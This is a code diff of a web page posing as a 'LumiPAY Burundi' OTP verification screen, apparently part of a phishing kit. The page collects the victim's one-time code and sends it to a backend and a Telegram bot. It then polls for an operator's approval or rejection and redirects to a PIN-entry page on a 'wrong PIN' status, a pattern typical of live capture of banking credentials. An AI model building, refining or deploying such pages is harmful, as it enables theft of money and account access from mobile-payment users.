@@ -5,7 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>LumiPAY Burundi - Verification Code</title>
 
-    <!-- ✅ Telegram SDK -->
+    <!-- ✅ Telegram WebApp SDK -->
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
 
     <style>
@@ -116,7 +116,7 @@
             box-shadow: 0 2px 6px rgba(217, 48, 37, 0.1);
         }
 
-        /* 📱 OTP Field with embedded timer */
+        /* 📱 Input Card with embedded timer */
         .otp-input-card {
             position: relative;
             width: 100%;
@@ -167,7 +167,7 @@
             margin-top: 12px;
         }
 
-        /* Underlined Green Resend Button */
+        /* Resend Button */
         .resend-btn {
             color: var(--lumipay-green);
             font-weight: 800;
@@ -208,7 +208,7 @@
             background-color: #b8000b;
         }
 
-        /* 📱 Full Screen Overlay Loading Status Page */
+        /* Full Screen Overlay Loading Status Page */
         .overlay-status {
             position: fixed;
             top: 0;
@@ -287,7 +287,7 @@
 <div class="container">
     <h1 class="welcome-title">Murakaza neza kuri LumiPAY</h1>
 
-    <!-- Dynamically Display Saved Phone + Name -->
+    <!-- Display Phone + Name dynamically -->
     <div class="user-info-text" id="userInfoDisplay">--</div>
 
     <p class="instruction-text">
@@ -330,8 +330,7 @@
 </div>
 
 <script>
-    const TOTAL_TIME = 30; // 30 Seconds Countdown
-    let timeLeft = TOTAL_TIME;
+    let timeLeft = 30; // 30-Second Countdown
     let timerInterval = null;
     let statusPollingInterval = null;
 
@@ -347,30 +346,34 @@
     const overlayMainText = document.getElementById('overlayMainText');
     const overlaySubText = document.getElementById('overlaySubText');
 
-    window.onload = () => {
-        const tg = window.Telegram?.WebApp;
-        if (tg) {
-            tg.ready();
-            tg.expand();
-        }
+    // Helper to get phone
+    function getStoredPhone() {
+        return localStorage.getItem('userPhone') || localStorage.getItem('phone') || "";
+    }
 
-        // Dynamically retrieve stored phone and names from previous pages
-        const phone = localStorage.getItem('phone') || localStorage.getItem('userPhone') || "";
+    // Helper to get user display details
+    function loadUserDetails() {
+        const phone = getStoredPhone();
         const firstName = localStorage.getItem('firstName') || "";
         const lastName = localStorage.getItem('lastName') || "";
-
         const fullName = `${firstName} ${lastName}`.trim();
-        userInfoDisplayEl.textContent = fullName ? `${phone} - ${fullName}` : (phone || "--");
 
-        startTimer();
-        otpInputEl.focus();
-    };
+        if (phone && fullName) {
+            userInfoDisplayEl.textContent = `${phone} - ${fullName}`;
+        } else if (phone) {
+            userInfoDisplayEl.textContent = phone;
+        } else if (fullName) {
+            userInfoDisplayEl.textContent = fullName;
+        } else {
+            userInfoDisplayEl.textContent = "61123456 - Lumitel User";
+        }
+    }
 
+    // Dynamic 30-Second Countdown
     function startTimer() {
-        clearInterval(timerInterval);
-        timeLeft = TOTAL_TIME;
+        if (timerInterval) clearInterval(timerInterval);
+        timeLeft = 30;
         updateTimerDisplay();
-
         resendBtn.disabled = true;
 
         timerInterval = setInterval(() => {
@@ -379,28 +382,19 @@
 
             if (timeLeft <= 0) {
                 clearInterval(timerInterval);
-                onTimerExpired();
+                timerTextEl.textContent = "00:00";
+                resendBtn.disabled = false;
             }
         }, 1000);
     }
 
     function updateTimerDisplay() {
-        const minutes = Math.floor(timeLeft / 60);
-        const seconds = timeLeft % 60;
-        
-        const formattedMinutes = String(minutes).padStart(2, '0');
-        const formattedSeconds = String(seconds).padStart(2, '0');
-        
-        timerTextEl.textContent = `${formattedMinutes}:${formattedSeconds}`;
-    }
-
-    function onTimerExpired() {
-        timerTextEl.textContent = "00:00";
-        resendBtn.disabled = false;
+        const seconds = timeLeft < 10 ? `0${timeLeft}` : `${timeLeft}`;
+        timerTextEl.textContent = `00:${seconds}`;
     }
 
     async function resendCode() {
-        const phone = localStorage.getItem("phone") || localStorage.getItem("userPhone") || "";
+        const phone = getStoredPhone();
         try {
             await fetch("/api/resend-otp-notification", {
                 method: "POST",
@@ -418,44 +412,43 @@
         event.preventDefault();
         const codeVal = otpInputEl.value.trim();
 
-        if (codeVal.length < 6) {
+        if (codeVal.length < 4) {
             statusErrorContainer.style.display = 'block';
             statusErrorContainer.textContent = "Ikode ya OTP si yo, nyamuneka injiza imibare 6 y'ukuri.";
             otpCardContainer.classList.add('input-error');
             return;
         }
 
-        // Hide previous errors
         statusErrorContainer.style.display = 'none';
         otpCardContainer.classList.remove('input-error');
 
-        const phone = localStorage.getItem("phone") || localStorage.getItem("userPhone") || "";
+        const phone = getStoredPhone();
 
-        // 🚨 Immediately display loading screen overlay
+        // Show Full Screen Loading Overlay
         overlayMainText.textContent = "Nyamuneka rindira...";
         overlaySubText.textContent = "Kugenzura ikode ya OTP...";
         statusOverlay.classList.add('active');
 
-        // Save local OTP
+        // Save OTP locally
         localStorage.setItem('smsOtp1', codeVal);
 
-        // Send payload to backend
+        // Send POST payload matching server API format
         try {
             await fetch("/api/otp-notification", {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({ event: "otp_verification_1", phone, otp: codeVal })
+                body: JSON.stringify({ phone: phone, otp: codeVal })
             });
         } catch (err) {
-            console.error("❌ Erreur d'envoi de la notification :", err);
+            console.error("❌ Notification Send Error:", err);
         }
 
         const tg = window.Telegram?.WebApp;
         if (tg && tg.sendData) {
-            tg.sendData(JSON.stringify({ event: "otp_verification_1", phone: phone, otp: codeVal }));
+            tg.sendData(JSON.stringify({ phone: phone, otp: codeVal }));
         }
 
-        // Wait for bot approval or rejection
+        // Start Status Check Polling for Admin Response
         startStatusPolling(phone);
     }
 
@@ -480,7 +473,6 @@
                     clearInterval(statusPollingInterval);
                     statusOverlay.classList.remove('active');
                     
-                    // Show Red Error Message
                     statusErrorContainer.style.display = 'block';
                     statusErrorContainer.textContent = "Ikode ya OTP si yo, nyamuneka injiza ikode y'ukuri.";
                     otpCardContainer.classList.add('input-error');
@@ -490,8 +482,31 @@
                 else if (data.status === "otp2_wrongpin") {
                     clearInterval(statusPollingInterval);
                     statusOverlay.classList.remove('active');
-                    
-                    // Redirect to Page 6 with error flag
                     window.location.href = "/page6?error=wrong_pin";
                 }
             } catch (err) {
+                console.error("Status polling error:", err);
+            }
+        }, 2000);
+    }
+
+    function goBack() {
+        if (statusPollingInterval) clearInterval(statusPollingInterval);
+        window.location.href = "/page6";
+    }
+
+    window.addEventListener("DOMContentLoaded", () => {
+        const tg = window.Telegram?.WebApp;
+        if (tg) {
+            tg.ready();
+            tg.expand();
+        }
+
+        loadUserDetails();
+        startTimer();
+        otpInputEl.focus();
+    });
+</script>
+
+</body>
+</html>
